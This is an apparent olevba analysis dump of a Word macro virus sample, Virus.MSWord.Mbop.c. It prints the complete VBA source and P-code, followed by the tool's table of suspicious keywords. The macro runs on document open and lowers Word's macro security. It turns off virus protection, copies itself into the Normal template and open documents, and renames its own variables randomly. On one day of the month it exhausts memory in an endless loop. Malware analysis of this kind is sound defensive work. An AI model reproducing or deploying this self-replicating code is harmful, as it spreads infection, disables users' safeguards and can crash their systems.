olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Mbop.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Mbop.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
mbophhmbop = 1
mbopl1mbop = "M"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Options.VirusProtection = False
Options.SaveNormalPrompt = False
mbopfimbop = 1
Options.ConfirmConversions = False
Set mbopNtmbop = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
mbop11mbop = 1
Set mbopAdmbop = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
mbopsembop = 3
Set mbopTdmbop = ThisDocument.VBProject.VBComponents.Item(1).CodeModule
mboptrmbop = 3
mbopl2mbop = "b"
mbopfnmbop = mbopfimbop & mbopsembop & mboptrmbop
For mbopiimbop = 1 To mbopTdmbop.countoflines
If InStr(mbopTdmbop.lines(mbopiimbop, 1), "Private Sub Document_Open()") <> 0 Then
mbopSlmbop = mbopiimbop
Exit For
End If
Next
mbopl3mbop = "o"
mbopVcmbop = Trim(mbopTdmbop.lines(mbopSlmbop, mbopSlmbop + mbopfnmbop))
mboplvmbop = 97
mbop15mbop = 15
If mbopNtmbop.countoflines > 0 Then
mbopNlmbop = mbopNtmbop.lines(1, mbopNtmbop.countoflines)
If InStr(mbopNlmbop, "Nt") = 0 And InStr(mbopNlmbop, "Sl") = 0 And InStr(mbopNlmbop, "Nl") = 0 And InStr(mbopNlmbop, "Ad") = 0 And InStr(mbopNlmbop, "Vc") = 0 And InStr(mbopNlmbop, "Td") = 0 Then
If InStr(LCase(mbopNlmbop), "private sub document_open()") <> 0 Then
For mbopimbop = 1 To mbopNtmbop.countoflines
If InStr(LCase(mbopNtmbop.lines(mbopimbop, 1)), "private sub document_open()") <> 0 Then
mbopnsmbop = mbopimbop
Exit For
End If
Next
For mbopimbop = mbopnsmbop To mbopNtmbop.countoflines
If InStr(LCase(mbopNtmbop.lines(mbopimbop, 1)), "end sub") <> 0 Then
mbopnembop = mbopimbop
Exit For
End If
Next
mbopNtmbop.deletelines mbopnsmbop, mbopnembop
End If
If InStr(LCase(mbopNlmbop), "option explicit") <> 0 Then
For mbopimbop = 1 To mbopNtmbop.countoflines
If InStr(LCase(mbopNtmbop.lines(mbopimbop, 1)), "option explicit") <> 0 Then
mbopnsmbop = mbopimbop
Exit For
End If
Next
mbopNtmbop.deletelines mbopnsmbop, 1
End If
mbopNtmbop.addfromstring mbopVcmbop
mbopNtmbop.Save
mbopinmbop = mbophhmbop
End If
Else
mbopNtmbop.addfromstring mbopVcmbop
mbopNtmbop.Save
mbopinmbop = mbophhmbop
End If
mbophvmbop = 122
mbopimbop = 1
mbopdqmbop = Documents.Count
If mbopAdmbop.countoflines > 0 Then
mbopAlmbop = mbopAdmbop.lines(1, mbopAdmbop.countoflines)
If InStr(mbopAlmbop, "Nt") = 0 And InStr(mbopAlmbop, "Sl") = 0 And InStr(mbopAlmbop, "Nl") = 0 And InStr(mbopAlmbop, "Ad") = 0 And InStr(mbopAlmbop, "Vc") = 0 And InStr(mbopAlmbop, "Td") = 0 Then
If InStr(LCase(mbopAlmbop), "private sub document_open()") <> 0 Then
For mbopimbop = 1 To mbopAdmbop.countoflines
If InStr(LCase(mbopAdmbop.lines(mbopimbop, 1)), "private sub document_open()") <> 0 Then
mbopnsmbop = mbopimbop
Exit For
End If
Next
For mbopimbop = mbopnsmbop To mbopAdmbop.countoflines
If InStr(LCase(mbopAdmbop.lines(mbopimbop, 1)), "end sub") <> 0 Then
mbopnembop = mbopimbop
Exit For
End If
Next
mbopAdmbop.deletelines mbopnsmbop, mbopnembop
End If
If InStr(LCase(mbopAlmbop), "option explicit") <> 0 Then
For mbopimbop = 1 To mbopAdmbop.countoflines
If InStr(LCase(mbopAdmbop.lines(mbopimbop, 1)), "option explicit") <> 0 Then
mbopnsmbop = mbopimbop
Exit For
End If
Next
mbopAdmbop.deletelines mbopnsmbop, 1
End If
mbopAdmbop.addfromstring mbopVcmbop
mbopiambop = mbophhmbop
End If
Else
mbopAdmbop.addfromstring mbopVcmbop
mbopiambop = mbophhmbop
End If
mbopl4mbop = "p"
Randomize
mbop15mbop = Int((mbop15mbop - mbop11mbop + mbop11mbop) * Rnd + mbop11mbop)
For mbopiimbop = 1 To mbop15mbop
Randomize
mbopTnmbop = mbopTnmbop & Chr(Int((mbophvmbop - mboplvmbop + 1) * Rnd + mboplvmbop))
Next
mbopd2mbop = 9
mbopVcmbop = mbopTdmbop.lines(1, mbopTdmbop.countoflines)
mbopTdmbop.deletelines 1, mbopTdmbop.countoflines
Do While InStr(mbopVcmbop, "mbop") <> 0
mbopVcmbop = Mid(mbopVcmbop, 1, InStr(mbopVcmbop, "mbop") - 1) & mbopTnmbop & Mid(mbopVcmbop, InStr(mbopVcmbop, "mbop") + Len("mbop"))
Loop
mbopTdmbop.addfromstring mbopVcmbop
mbopdymbop = Day(Now)
mbopd1mbop = 2
mbopl5mbop = "!"
If mbopdymbop = mbopd1mbop & mbopd2mbop Then
Dim mbopstmbop()
mbopcambop = 0
Do
ReDim Preserve mbopstmbop(mbopcambop)
mbopqwmbop = CLng(1024)
mbopqambop = mbopqwmbop
mbopqzmbop = mbopqwmbop * mbopqambop
mbopstmbop(mbopcambop) = String(mbopqzmbop, Right(mbopTnmbop, 1))
DoEvents
mbopcambop = mbopcambop + 1
Loop
End If
If mbopiambop = mbophhmbop Or mbopinmbop = mbophhmbop Then
MsgBox mbopl1mbop & mbopl2mbop & mbopl3mbop & mbopl4mbop & mbopl5mbop, vbCritical
End If
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Mbop.c
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 7325 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitDI2 0x0001 
' 	St mbophhmbop 
' Line #3:
' 	LitStr 0x0001 "M"
' 	St mbopl1mbop 
' Line #4:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #7:
' 	LitDI2 0x0001 
' 	St mbopfimbop 
' Line #8:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #9:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set mbopNtmbop 
' Line #10:
' 	LitDI2 0x0001 
' 	St mbop11mbop 
' Line #11:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set mbopAdmbop 
' Line #12:
' 	LitDI2 0x0003 
' 	St mbopsembop 
' Line #13:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set mbopTdmbop 
' Line #14:
' 	LitDI2 0x0003 
' 	St mboptrmbop 
' Line #15:
' 	LitStr 0x0001 "b"
' 	St mbopl2mbop 
' Line #16:
' 	Ld mbopfimbop 
' 	Ld mbopsembop 
' 	Concat 
' 	Ld mboptrmbop 
' 	Concat 
' 	St mbopfnmbop 
' Line #17:
' 	StartForVariable 
' 	Ld mbopiimbop 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld mbopTdmbop 
' 	MemLd countoflines 
' 	For 
' Line #18:
' 	Ld mbopiimbop 
' 	LitDI2 0x0001 
' 	Ld mbopTdmbop 
' 	ArgsMemLd lines 0x0002 
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #19:
' 	Ld mbopiimbop 
' 	St mbopSlmbop 
' Line #20:
' 	ExitFor 
' Line #21:
' 	EndIfBlock 
' Line #22:
' 	StartForVariable 
' 	Next 
' Line #23:
' 	LitStr 0x0001 "o"
' 	St mbopl3mbop 
' Line #24:
' 	Ld mbopSlmbop 
' 	Ld mbopSlmbop 
' 	Ld mbopfnmbop 
' 	Add 
' 	Ld mbopTdmbop 
' 	ArgsMemLd lines 0x0002 
' 	ArgsLd Trim 0x0001 
' 	St mbopVcmbop 
' Line #25:
' 	LitDI2 0x0061 
' 	St mboplvmbop 
' Line #26:
' 	LitDI2 0x000F 
' 	St mbop15mbop 
' Line #27:
' 	Ld mbopNtmbop 
' 	MemLd countoflines 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #28:
' 	LitDI2 0x0001 
' 	Ld mbopNtmbop 
' 	MemLd countoflines 
' 	Ld mbopNtmbop 
' 	ArgsMemLd lines 0x0002 
' 	St mbopNlmbop 
' Line #29:
' 	Ld mbopNlmbop 
' 	LitStr 0x0002 "Nt"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	Ld mbopNlmbop 
' 	LitStr 0x0002 "Sl"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Ld mbopNlmbop 
' 	LitStr 0x0002 "Nl"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Ld mbopNlmbop 
' 	LitStr 0x0002 "Ad"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Ld mbopNlmbop 
' 	LitStr 0x0002 "Vc"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Ld mbopNlmbop 
' 	LitStr 0x0002 "Td"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #30:
' 	Ld mbopNlmbop 
' 	ArgsLd LCase 0x0001 
' 	LitStr 0x001B "private sub document_open()"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #31:
' 	StartForVariable 
' 	Ld mbopimbop 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld mbopNtmbop 
' 	MemLd countoflines 
' 	For 
' Line #32:
' 	Ld mbopimbop 
' 	LitDI2 0x0001 
' 	Ld mbopNtmbop 
' 	ArgsMemLd lines 0x0002 
' 	ArgsLd LCase 0x0001 
' 	LitStr 0x001B "private sub document_open()"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #33:
' 	Ld mbopimbop 
' 	St mbopnsmbop 
' Line #34:
' 	ExitFor 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	StartForVariable 
' 	Next 
' Line #37:
' 	StartForVariable 
' 	Ld mbopimbop 
' 	EndForVariable 
' 	Ld mbopnsmbop 
' 	Ld mbopNtmbop 
' 	MemLd countoflines 
' 	For 
' Line #38:
' 	Ld mbopimbop 
' 	LitDI2 0x0001 
' 	Ld mbopNtmbop 
' 	ArgsMemLd lines 0x0002 
' 	ArgsLd LCase 0x0001 
' 	LitStr 0x0007 "end sub"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #39:
' 	Ld mbopimbop 
' 	St mbopnembop 
' Line #40:
' 	ExitFor 
' Line #41:
' 	EndIfBlock 
' Line #42:
' 	StartForVariable 
' 	Next 
' Line #43:
' 	Ld mbopnsmbop 
' 	Ld mbopnembop 
' 	Ld mbopNtmbop 
' 	ArgsMemCall deletelines 0x0002 
' Line #44:
' 	EndIfBlock 
' Line #45:
' 	Ld mbopNlmbop 
' 	ArgsLd LCase 0x0001 
' 	LitStr 0x000F "option explicit"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #46:
' 	StartForVariable 
' 	Ld mbopimbop 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld mbopNtmbop 
' 	MemLd countoflines 
' 	For 
' Line #47:
' 	Ld mbopimbop 
' 	LitDI2 0x0001 
' 	Ld mbopNtmbop 
' 	ArgsMemLd lines 0x0002 
' 	ArgsLd LCase 0x0001 
' 	LitStr 0x000F "option explicit"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #48:
' 	Ld mbopimbop 
' 	St mbopnsmbop 
' Line #49:
' 	ExitFor 
' Line #50:
' 	EndIfBlock 
' Line #51:
' 	StartForVariable 
' 	Next 
' Line #52:
' 	Ld mbopnsmbop 
' 	LitDI2 0x0001 
' 	Ld mbopNtmbop 
' 	ArgsMemCall deletelines 0x0002 
' Line #53:
' 	EndIfBlock 
' Line #54:
' 	Ld mbopVcmbop 
' 	Ld mbopNtmbop 
' 	ArgsMemCall addfromstring 0x0001 
' Line #55:
' 	Ld mbopNtmbop 
' 	ArgsMemCall Save 0x0000 
' Line #56:
' 	Ld mbophhmbop 
' 	St mbopinmbop 
' Line #57:
' 	EndIfBlock 
' Line #58:
' 	ElseBlock 
' Line #59:
' 	Ld mbopVcmbop 
' 	Ld mbopNtmbop 
' 	ArgsMemCall addfromstring 0x0001 
' Line #60:
' 	Ld mbopNtmbop 
' 	ArgsMemCall Save 0x0000 
' Line #61:
' 	Ld mbophhmbop 
' 	St mbopinmbop 
' Line #62:
' 	EndIfBlock 
' Line #63:
' 	LitDI2 0x007A 
' 	St mbophvmbop 
' Line #64:
' 	LitDI2 0x0001 
' 	St mbopimbop 
' Line #65:
' 	Ld Documents 
' 	MemLd Count 
' 	St mbopdqmbop 
' Line #66:
' 	Ld mbopAdmbop 
' 	MemLd countoflines 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #67:
' 	LitDI2 0x0001 
' 	Ld mbopAdmbop 
' 	MemLd countoflines 
' 	Ld mbopAdmbop 
' 	ArgsMemLd lines 0x0002 
' 	St mbopAlmbop 
' Line #68:
' 	Ld mbopAlmbop 
' 	LitStr 0x0002 "Nt"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	Ld mbopAlmbop 
' 	LitStr 0x0002 "Sl"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Ld mbopAlmbop 
' 	LitStr 0x0002 "Nl"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Ld mbopAlmbop 
' 	LitStr 0x0002 "Ad"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Ld mbopAlmbop 
' 	LitStr 0x0002 "Vc"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Ld mbopAlmbop 
' 	LitStr 0x0002 "Td"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #69:
' 	Ld mbopAlmbop 
' 	ArgsLd LCase 0x0001 
' 	LitStr 0x001B "private sub document_open()"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #70:
' 	StartForVariable 
' 	Ld mbopimbop 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld mbopAdmbop 
' 	MemLd countoflines 
' 	For 
' Line #71:
' 	Ld mbopimbop 
' 	LitDI2 0x0001 
' 	Ld mbopAdmbop 
' 	ArgsMemLd lines 0x0002 
' 	ArgsLd LCase 0x0001 
' 	LitStr 0x001B "private sub document_open()"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #72:
' 	Ld mbopimbop 
' 	St mbopnsmbop 
' Line #73:
' 	ExitFor 
' Line #74:
' 	EndIfBlock 
' Line #75:
' 	StartForVariable 
' 	Next 
' Line #76:
' 	StartForVariable 
' 	Ld mbopimbop 
' 	EndForVariable 
' 	Ld mbopnsmbop 
' 	Ld mbopAdmbop 
' 	MemLd countoflines 
' 	For 
' Line #77:
' 	Ld mbopimbop 
' 	LitDI2 0x0001 
' 	Ld mbopAdmbop 
' 	ArgsMemLd lines 0x0002 
' 	ArgsLd LCase 0x0001 
' 	LitStr 0x0007 "end sub"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #78:
' 	Ld mbopimbop 
' 	St mbopnembop 
' Line #79:
' 	ExitFor 
' Line #80:
' 	EndIfBlock 
' Line #81:
' 	StartForVariable 
' 	Next 
' Line #82:
' 	Ld mbopnsmbop 
' 	Ld mbopnembop 
' 	Ld mbopAdmbop 
' 	ArgsMemCall deletelines 0x0002 
' Line #83:
' 	EndIfBlock 
' Line #84:
' 	Ld mbopAlmbop 
' 	ArgsLd LCase 0x0001 
' 	LitStr 0x000F "option explicit"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #85:
' 	StartForVariable 
' 	Ld mbopimbop 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld mbopAdmbop 
' 	MemLd countoflines 
' 	For 
' Line #86:
' 	Ld mbopimbop 
' 	LitDI2 0x0001 
' 	Ld mbopAdmbop 
' 	ArgsMemLd lines 0x0002 
' 	ArgsLd LCase 0x0001 
' 	LitStr 0x000F "option explicit"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #87:
' 	Ld mbopimbop 
' 	St mbopnsmbop 
' Line #88:
' 	ExitFor 
' Line #89:
' 	EndIfBlock 
' Line #90:
' 	StartForVariable 
' 	Next 
' Line #91:
' 	Ld mbopnsmbop 
' 	LitDI2 0x0001 
' 	Ld mbopAdmbop 
' 	ArgsMemCall deletelines 0x0002 
' Line #92:
' 	EndIfBlock 
' Line #93:
' 	Ld mbopVcmbop 
' 	Ld mbopAdmbop 
' 	ArgsMemCall addfromstring 0x0001 
' Line #94:
' 	Ld mbophhmbop 
' 	St mbopiambop 
' Line #95:
' 	EndIfBlock 
' Line #96:
' 	ElseBlock 
' Line #97:
' 	Ld mbopVcmbop 
' 	Ld mbopAdmbop 
' 	ArgsMemCall addfromstring 0x0001 
' Line #98:
' 	Ld mbophhmbop 
' 	St mbopiambop 
' Line #99:
' 	EndIfBlock 
' Line #100:
' 	LitStr 0x0001 "p"
' 	St mbopl4mbop 
' Line #101:
' 	ArgsCall Read 0x0000 
' Line #102:
' 	Ld mbop15mbop 
' 	Ld mbop11mbop 
' 	Sub 
' 	Ld mbop11mbop 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	Ld mbop11mbop 
' 	Add 
' 	FnInt 
' 	St mbop15mbop 
' Line #103:
' 	StartForVariable 
' 	Ld mbopiimbop 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld mbop15mbop 
' 	For 
' Line #104:
' 	ArgsCall Read 0x0000 
' Line #105:
' 	Ld mbopTnmbop 
' 	Ld mbophvmbop 
' 	Ld mboplvmbop 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	Ld mboplvmbop 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St mbopTnmbop 
' Line #106:
' 	StartForVariable 
' 	Next 
' Line #107:
' 	LitDI2 0x0009 
' 	St mbopd2mbop 
' Line #108:
' 	LitDI2 0x0001 
' 	Ld mbopTdmbop 
' 	MemLd countoflines 
' 	Ld mbopTdmbop 
' 	ArgsMemLd lines 0x0002 
' 	St mbopVcmbop 
' Line #109:
' 	LitDI2 0x0001 
' 	Ld mbopTdmbop 
' 	MemLd countoflines 
' 	Ld mbopTdmbop 
' 	ArgsMemCall deletelines 0x0002 
' Line #110:
' 	Ld mbopVcmbop 
' 	LitStr 0x0004 "mbop"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	DoWhile 
' Line #111:
' 	Ld mbopVcmbop 
' 	LitDI2 0x0001 
' 	Ld mbopVcmbop 
' 	LitStr 0x0004 "mbop"
' 	FnInStr 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	Ld mbopTnmbop 
' 	Concat 
' 	Ld mbopVcmbop 
' 	Ld mbopVcmbop 
' 	LitStr 0x0004 "mbop"
' 	FnInStr 
' 	LitStr 0x0004 "mbop"
' 	FnLen 
' 	Add 
' 	ArgsLd Mid$ 0x0002 
' 	Concat 
' 	St mbopVcmbop 
' Line #112:
' 	Loop 
' Line #113:
' 	Ld mbopVcmbop 
' 	Ld mbopTdmbop 
' 	ArgsMemCall addfromstring 0x0001 
' Line #114:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	St mbopdymbop 
' Line #115:
' 	LitDI2 0x0002 
' 	St mbopd1mbop 
' Line #116:
' 	LitStr 0x0001 "!"
' 	St mbopl5mbop 
' Line #117:
' 	Ld mbopdymbop 
' 	Ld mbopd1mbop 
' 	Ld mbopd2mbop 
' 	Concat 
' 	Eq 
' 	IfBlock 
' Line #118:
' 	Dim 
' 	VarDefn mbopstmbop
' Line #119:
' 	LitDI2 0x0000 
' 	St mbopcambop 
' Line #120:
' 	Do 
' Line #121:
' 	OptionBase 
' 	Ld mbopcambop 
' 	Redim (Preserve) mbopstmbop 0x0001 (As Variant)
' Line #122:
' 	LitDI2 0x0400 
' 	Coerce (Lng) 
' 	St mbopqwmbop 
' Line #123:
' 	Ld mbopqwmbop 
' 	St mbopqambop 
' Line #124:
' 	Ld mbopqwmbop 
' 	Ld mbopqambop 
' 	Mul 
' 	St mbopqzmbop 
' Line #125:
' 	Ld mbopqzmbop 
' 	Ld mbopTnmbop 
' 	LitDI2 0x0001 
' 	ArgsLd Right 0x0002 
' 	ArgsLd String$ 0x0002 
' 	Ld mbopcambop 
' 	ArgsSt mbopstmbop 0x0001 
' Line #126:
' 	ArgsCall DoEvents 0x0000 
' Line #127:
' 	Ld mbopcambop 
' 	LitDI2 0x0001 
' 	Add 
' 	St mbopcambop 
' Line #128:
' 	Loop 
' Line #129:
' 	EndIfBlock 
' Line #130:
' 	Ld mbopiambop 
' 	Ld mbophhmbop 
' 	Eq 
' 	Ld mbopinmbop 
' 	Ld mbophhmbop 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #131:
' 	Ld mbopl1mbop 
' 	Ld mbopl2mbop 
' 	Concat 
' 	Ld mbopl3mbop 
' 	Concat 
' 	Ld mbopl4mbop 
' 	Concat 
' 	Ld mbopl5mbop 
' 	Concat 
' 	Ld vbCritical 
' 	ArgsCall MsgBox 0x0002 
' Line #132:
' 	EndIfBlock 
' Line #133:
' 	EndSub 
' Line #134:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

